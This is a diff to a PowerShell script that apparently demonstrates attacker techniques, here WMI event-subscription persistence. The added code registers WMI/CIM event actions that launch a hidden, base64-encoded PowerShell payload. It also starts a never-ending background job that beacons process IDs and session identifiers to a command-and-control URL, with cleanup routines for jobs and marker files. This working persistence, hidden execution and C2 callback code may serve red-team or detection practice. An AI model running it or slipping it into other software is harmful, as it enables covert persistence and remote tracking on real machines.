@@ -485,7 +485,75 @@ function Undo-LiveChanges {
         }
     }
 
+    # Stop any persistent polling jobs started by this script (session-scoped)
+    try {
+        $pollJobs = Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'DemoWmiPoller_*' }
+        if ($pollJobs) {
+            foreach ($j in $pollJobs) {
+                try { Stop-Job -Job $j -Force -ErrorAction SilentlyContinue } catch {}
+                try { Remove-Job -Job $j -ErrorAction SilentlyContinue } catch {}
+            }
+            Write-Host "    [OK] Stopped and removed polling jobs." -ForegroundColor Green
+        }
+        else {
+            Write-Host "    [*] No polling jobs found." -ForegroundColor Gray
+        }
+    }
+    catch {
+        Write-Host "    [!] Error while stopping polling jobs: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+
+    # Remove any marker files created for session subscriptions
+    try {
+        $markers = Get-ChildItem -Path $env:TEMP -Filter 'DemoWmi_*.marker' -ErrorAction SilentlyContinue
+        if ($markers) {
+            foreach ($m in $markers) {
+                try { Remove-Item -Path $m.FullName -Force -ErrorAction SilentlyContinue } catch {}
+            }
+            Write-Host "    [OK] Removed subscription markers." -ForegroundColor Green
+        }
+        else {
+            Write-Host "    [*] No subscription markers found." -ForegroundColor Gray
+        }
+    }
+    catch {
+        Write-Host "    [!] Error while removing markers: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+
     Write-Host "[*] Undo complete." -ForegroundColor Cyan
+}
+
+function Start-PersistentProcessPoller {
+    param(
+        [string]$JobName,
+        [string]$DesktopPath,
+        [string]$C2Url,
+        [string]$SessionId,
+        [int]$PollInterval = 1
+    )
+
+    $sb = {
+        param($dp,$c2Url,$sid,$pollInterval)
+        $known = @()
+        try { $known = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id } catch { $known = @() }
+        while ($true) {
+            Start-Sleep -Seconds $pollInterval
+            try { $current = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id } catch { $current = @() }
+            $added = $current | Where-Object { $known -notcontains $_ }
+            if ($added) {
+                foreach ($pid in $added) {
+                    try {
+                        $line = "Polling detected new PID $pid at $(Get-Date -Format o) by session $sid`r`n"
+                        [System.IO.File]::AppendAllText((Join-Path $dp 'calcLOG.txt'), $line)
+                        try { (New-Object System.Net.WebClient).DownloadString("$c2Url/?message=process-start&session=$sid&pid=$pid") > $null } catch {}
+                    } catch {}
+                }
+                $known = $current
+            }
+        }
+    }
+
+    Start-Job -Name $JobName -ScriptBlock $sb -ArgumentList $DesktopPath,$C2Url,$SessionId,$PollInterval
 }
 
 function Show-WMIEventSub {
@@ -538,11 +606,11 @@ function Show-WMIEventSub {
         Write-Host "[+] Technique 6: WMI Event Subscription (LIVE EXECUTION)" -ForegroundColor Green
         
         # --- Configuration ---
-    $payload = @"
-        try {
-            Invoke-RestMethod -Uri '$Global:C2Url/?message=how-are-you-session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
-            Add-Content -Path '$desktopPath\calcLOG.txt' -Value 'Successfully executed payload via WMI.' -ErrorAction SilentlyContinue
-        } catch { }
+        $payload = @"
+try {
+    Invoke-RestMethod -Uri '$Global:C2Url/?message=how-are-you-session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
+    Add-Content -Path '$desktopPath\calcLOG.txt' -Value 'Successfully executed payload via WMI.' -ErrorAction SilentlyContinue
+} catch { }
 "@
 
         $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
@@ -572,31 +640,51 @@ function Show-WMIEventSub {
             $sid = $Global:UniqueId
             $dp = $desktopPath
 
-            # Try session-based registration first (CIM/WMI). If that fails, fall back to a simple polling demo.
+            # Prepare a self-contained payload that will be launched by the event action (encoded)
+            $sessionPayload = @"
+try {
+    Add-Content -Path '$dp\\calcLOG.txt' -Value 'Executed payload at $(Get-Date -Format o) by session $sid' -ErrorAction SilentlyContinue
+    try { (New-Object System.Net.WebClient).DownloadString('$c2Url/?message=how-are-you-session=$sid') > $null } catch {}
+} catch {}
+"@
+
+            $encPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($sessionPayload))
+
+            # Try session-based registration first (CIM/WMI). If that fails, fall back to a persistent poller job.
             $registered = $false
 
             if (Get-Command -Name Register-CimIndicationEvent -ErrorAction SilentlyContinue) {
                 try {
-                    Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action { Invoke-WmiPayloadAction } -ErrorAction Stop
+                    $actionScript = "Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-EncodedCommand','$encPayload')"
+                    $actionSB = [ScriptBlock]::Create($actionScript)
+                    Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action $actionSB -ErrorAction Stop
                     Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
                     Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
                     $registered = $true
+
+                    # Write a marker so Undo and future runs can see there was a session subscription (session-bound cleanup still limited)
+                    try { Set-Content -Path (Join-Path $env:TEMP "DemoWmi_$source.marker") -Value "Source=$source`nMethod=CIM`nRegisteredAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
                 }
                 catch {
                     Write-Warning "    [!] Failed to register session-based CIM subscription: $($_.Exception.Message)"
+                    try { Set-Content -Path (Join-Path $env:TEMP "$source.err") -Value $_.ToString() -Force -ErrorAction SilentlyContinue } catch {}
                     $registered = $false
                 }
             }
 
             if (-not $registered -and (Get-Command -Name Register-WmiEvent -ErrorAction SilentlyContinue)) {
                 try {
-                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action { Invoke-WmiPayloadAction } -Namespace 'root\cimv2' -ErrorAction Stop
+                    $actionScript = "Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-EncodedCommand','$encPayload')"
+                    $actionSB = [ScriptBlock]::Create($actionScript)
+                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action $actionSB -Namespace 'root\cimv2' -ErrorAction Stop
                     Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
                     Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
                     $registered = $true
+                    try { Set-Content -Path (Join-Path $env:TEMP "DemoWmi_$source.marker") -Value "Source=$source`nMethod=WMI`nRegisteredAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
                 }
                 catch {
                     Write-Warning "    [!] Failed to register session-based WMI subscription: $($_.Exception.Message)"
+                    try { Set-Content -Path (Join-Path $env:TEMP "$source.err") -Value $_.ToString() -Force -ErrorAction SilentlyContinue } catch {}
                     $registered = $false
                 }
             }
@@ -610,28 +698,21 @@ function Show-WMIEventSub {
                     Write-Host "    [OK] Session-based WMI action executed: calcLOG.txt created." -ForegroundColor Green
                 }
                 else {
-                    Write-Host "    [!] Session-based WMI action not observed (no calcLOG.txt)." -ForegroundColor Yellow
+                    Write-Host "    [!] Session-based WMI action not observed (no calcLOG.txt). Starting persistent poller as backup." -ForegroundColor Yellow
+                    # Start a background poller to catch events repeatedly if the event action isn't firing as expected
+                    $jobName = "DemoWmiPoller_$($Global:UniqueId)"
+                    Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 | Out-Null
+                    try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
                 }
                 return
             }
 
-            # Polling fallback: no registration possible, poll process list briefly to demonstrate
-            Write-Host "    [*] Session registration unavailable; using polling fallback for demo." -ForegroundColor Yellow
-            $existingIds = Get-Process | Select-Object -ExpandProperty Id
-            Start-Process calc.exe -NoNewWindow
-            $found = $false
-            for ($i=0; $i -lt 8 -and -not $found; $i++) {
-                Start-Sleep -Seconds 1
-                $currentIds = Get-Process | Select-Object -ExpandProperty Id
-                $new = $currentIds | Where-Object { $existingIds -notcontains $_ }
-                if ($new) {
-                    try { Invoke-WmiPayloadAction } catch {}
-                    Write-Host "    [OK] Polling fallback detected new process and executed payload." -ForegroundColor Green
-                    $found = $true
-                    break
-                }
-            }
-            if (-not $found) { Write-Host "    [!] Polling fallback did not detect new process." -ForegroundColor Yellow }
+            # Polling fallback: no registration possible, start a persistent poller job
+            Write-Host "    [*] Session registration unavailable; starting persistent polling fallback." -ForegroundColor Yellow
+            $jobName = "DemoWmiPoller_$($Global:UniqueId)"
+            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 | Out-Null
+            try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
+            Write-Host "    [OK] Poller started (Job Name: $jobName)." -ForegroundColor Green
             return
         }
 
